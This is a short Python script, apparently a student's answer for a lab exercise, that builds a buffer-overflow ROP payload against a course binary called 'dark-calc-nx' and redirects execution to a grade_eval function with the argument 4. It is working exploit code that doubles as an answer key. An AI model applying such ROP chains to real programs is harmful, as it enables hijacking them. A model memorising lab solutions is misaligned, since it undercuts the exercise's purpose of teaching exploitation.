#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

TODO: replace the empty payload with the bytes required by the lab.
"""

#!/usr/bin/env python3
import sys
import struct
import subprocess
import re
from pathlib import Path

# 定位老师提供的目标二进制文件
root = Path(__file__).resolve().parent
binary = root / "attack" / "dark-calc-nx"

# 从符号表获取 grade_eval 的地址
symbols = subprocess.check_output(
    ["nm", "-n", str(binary)],
    text=True
)

match = re.search(
    r"(?m)^([0-9a-fA-F]+)\s+\w\s+grade_eval$",
    symbols
)
assert match is not None, "Cannot find grade_eval"

grade_addr = int(match.group(1), 16)

def p64(value):
    return struct.pack("<Q", value)

# 从目标二进制中找到的 ROP gadgets
pop_rdi_ret = 0x401a33
ret = 0x401a34

# 覆盖缓冲区与保存的 rbp
payload = b"A" * 24

# ROP 链
payload += p64(pop_rdi_ret)
payload += p64(4)
payload += p64(ret)
payload += p64(grade_addr)

assert len(payload) == 56
assert b"\x0a" not in payload

sys.stdout.buffer.write(payload)
